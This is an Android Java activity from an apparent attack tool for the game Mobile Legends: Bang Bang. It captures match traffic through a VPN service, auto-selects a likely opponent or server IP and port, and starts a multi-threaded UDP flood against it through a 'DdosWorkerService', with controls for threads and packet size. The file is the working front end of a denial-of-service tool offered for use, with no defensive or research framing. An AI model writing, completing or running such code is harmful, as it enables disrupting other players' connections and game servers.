package com.paneer.mlbbipdetect;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int VPN_REQUEST_CODE = 0xC001;

    private TextView tvCaptureStatus, tvIpList, tvDdosStatus, tvLog;
    private EditText etTargetIp, etTargetPort, etThreads, etPacketSize;
    private Button btnStartCapture, btnStopCapture, btnStartDdos, btnStopDdos;
    private Button btnRefreshIps, btnClearLog;

    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private final StringBuilder logBuf = new StringBuilder();
    private boolean captureRunning = false;
    private boolean floodRunning = false;

    private final BroadcastReceiver captureReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String status = intent.getStringExtra(VpnCaptureService.EXTRA_STATUS);
            String msg = intent.getStringExtra(VpnCaptureService.EXTRA_MSG);
            if (status == null) return;
            uiHandler.post(() -> {
                tvCaptureStatus.setText("Status: " + status);
                log(msg != null ? msg : status);
                captureRunning = "RUNNING".equals(status);
                updateCaptureButtons();
                if (captureRunning) refreshIpList();
            });
        }
    };

    private final BroadcastReceiver floodReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String status = intent.getStringExtra("status");
            if (status == null) return;
            uiHandler.post(() -> {
                if ("RUNNING".equals(status)) {
                    long pkts = intent.getLongExtra("packets", 0);
                    long bytes = intent.getLongExtra("bytes", 0);
                    int thr = intent.getIntExtra("threads", 0);
                    tvDdosStatus.setText(String.format("Flood: RUNNING  pkts=%d  bytes=%d  thr=%d",
                            pkts, bytes, thr));
                    floodRunning = true;
                } else if ("STOPPED".equals(status)) {
                    tvDdosStatus.setText("Flood: STOPPED");
                    floodRunning = false;
                    log("Flood stopped.");
                } else if ("ERROR".equals(status)) {
                    String msg = intent.getStringExtra("msg");
                    log("Flood error: " + msg);
                }
                updateFloodButtons();
            });
        }
    };

    private final Runnable refreshTask = new Runnable() {
        @Override
        public void run() {
            if (captureRunning) {
                refreshIpList();
                uiHandler.postDelayed(this, 2000);
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvCaptureStatus = findViewById(R.id.tvCaptureStatus);
        tvIpList = findViewById(R.id.tvIpList);
        tvDdosStatus = findViewById(R.id.tvDdosStatus);
        tvLog = findViewById(R.id.tvLog);
        etTargetIp = findViewById(R.id.etTargetIp);
        etTargetPort = findViewById(R.id.etTargetPort);
        etThreads = findViewById(R.id.etThreads);
        etPacketSize = findViewById(R.id.etPacketSize);
        btnStartCapture = findViewById(R.id.btnStartCapture);
        btnStopCapture = findViewById(R.id.btnStopCapture);
        btnStartDdos = findViewById(R.id.btnStartDdos);
        btnStopDdos = findViewById(R.id.btnStopDdos);
        btnRefreshIps = findViewById(R.id.btnRefreshIps);
        btnClearLog = findViewById(R.id.btnClearLog);

        btnStartCapture.setOnClickListener(v -> requestVpn());
        btnStopCapture.setOnClickListener(v -> stopCapture());
        btnRefreshIps.setOnClickListener(v -> refreshIpList());
        btnStartDdos.setOnClickListener(v -> startFlood());
        btnStopDdos.setOnClickListener(v -> stopFlood());
        btnClearLog.setOnClickListener(v -> {
            logBuf.setLength(0);
            tvLog.setText("Ready.\n");
        });

        registerReceivers();
        log("Ready. Start capture → open MLBB → enter match → refresh IPs.");
    }

    private void registerReceivers() {
        IntentFilter f1 = new IntentFilter(VpnCaptureService.BROADCAST_STATUS);
        IntentFilter f2 = new IntentFilter(DdosWorkerService.BROADCAST_FLOOD);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(captureReceiver, f1, Context.RECEIVER_NOT_EXPORTED);
            registerReceiver(floodReceiver, f2, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(captureReceiver, f1);
            registerReceiver(floodReceiver, f2);
        }
    }

    private void requestVpn() {
        Intent prepare = VpnService.prepare(this);
        if (prepare != null) {
            startActivityForResult(prepare, VPN_REQUEST_CODE);
        } else {
            onActivityResult(VPN_REQUEST_CODE, Activity.RESULT_OK, null);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == VPN_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK) {
                Intent i = new Intent(this, VpnCaptureService.class);
                i.setAction(VpnCaptureService.ACTION_START);
                ContextCompat.startForegroundService(this, i);
                log("VPN permission granted. Starting capture…");
            } else {
                log("VPN permission denied.");
                Toast.makeText(this, "VPN permission required", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void stopCapture() {
        Intent i = new Intent(this, VpnCaptureService.class);
        i.setAction(VpnCaptureService.ACTION_STOP);
        startService(i);
        captureRunning = false;
        updateCaptureButtons();
        uiHandler.removeCallbacks(refreshTask);
    }

    private void refreshIpList() {
        List<IpEntry> list = VpnCaptureService.STORE.getSorted();
        if (list.isEmpty()) {
            tvIpList.setText("No IPs captured yet.\nStart capture → open MLBB → enter match.");
            return;
        }
        StringBuilder sb = new StringBuilder();
        int shown = 0;
        for (IpEntry e : list) {
            sb.append(e.toString()).append("\n");
            shown++;
            if (shown >= 25) break;
        }
        tvIpList.setText(sb.toString());

        // auto-fill best candidate
        List<IpEntry> cands = VpnCaptureService.STORE.getCandidates();
        if (!cands.isEmpty() && etTargetIp.getText().toString().trim().isEmpty()) {
            IpEntry best = cands.get(0);
            etTargetIp.setText(best.ip);
            etTargetPort.setText(String.valueOf(best.port));
            log("Auto-filled candidate: " + best.ip + ":" + best.port);
        }
    }

    private void startFlood() {
        String ip = etTargetIp.getText().toString().trim();
        if (ip.isEmpty()) {
            Toast.makeText(this, "Enter target IP", Toast.LENGTH_SHORT).show();
            return;
        }
        int port;
        int threads;
        int size;
        try {
            port = Integer.parseInt(etTargetPort.getText().toString().trim());
            threads = Integer.parseInt(etThreads.getText().toString().trim());
            size = Integer.parseInt(etPacketSize.getText().toString().trim());
        } catch (NumberFormatException e) {
            Toast.makeText(this, "Invalid number", Toast.LENGTH_SHORT).show();
            return;
        }

        Intent i = new Intent(this, DdosWorkerService.class);
        i.setAction(DdosWorkerService.ACTION_START);
        i.putExtra(DdosWorkerService.EXTRA_IP, ip);
        i.putExtra(DdosWorkerService.EXTRA_PORT, port);
        i.putExtra(DdosWorkerService.EXTRA_THREADS, threads);
        i.putExtra(DdosWorkerService.EXTRA_SIZE, size);
        ContextCompat.startForegroundService(this, i);
        log("Starting UDP flood → " + ip + ":" + port + "  threads=" + threads + " size=" + size);
        floodRunning = true;
        updateFloodButtons();
    }

    private void stopFlood() {
        Intent i = new Intent(this, DdosWorkerService.class);
        i.setAction(DdosWorkerService.ACTION_STOP);
        startService(i);
        floodRunning = false;
        updateFloodButtons();
    }

    private void updateCaptureButtons() {
        btnStartCapture.setEnabled(!captureRunning);
        btnStopCapture.setEnabled(captureRunning);
        if (captureRunning) {
            uiHandler.removeCallbacks(refreshTask);
            uiHandler.post(refreshTask);
        }
    }

    private void updateFloodButtons() {
        btnStartDdos.setEnabled(!floodRunning);
        btnStopDdos.setEnabled(floodRunning);
    }

    private void log(String line) {
        logBuf.append(line).append("\n");
        if (logBuf.length() > 4000) {
            logBuf.delete(0, logBuf.length() - 3000);
        }
        tvLog.setText(logBuf.toString());
    }

    @Override
    protected void onDestroy() {
        try {
            unregisterReceiver(captureReceiver);
            unregisterReceiver(floodReceiver);
        } catch (Exception ignored) {}
        uiHandler.removeCallbacks(refreshTask);
        super.onDestroy();
    }
}
